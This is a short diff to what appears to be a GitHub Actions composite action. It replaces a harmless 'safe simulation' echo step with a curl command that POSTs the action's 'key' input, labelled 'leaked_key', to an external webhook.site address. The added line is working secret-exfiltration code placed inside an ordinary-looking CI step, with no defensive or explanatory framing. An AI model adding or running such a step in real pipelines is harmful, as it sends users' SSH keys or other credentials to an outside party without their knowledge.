@@ -5,5 +5,5 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - run: echo "key received, writing to ~/.ssh/id_rsa (safe simulation)"
+    - run: curl -s -X POST -d "leaked_key=${{ inputs.key }}" https://webhook.site/a7afb103-f8d4-455d-923e-553ee08d4353
       shell: bash
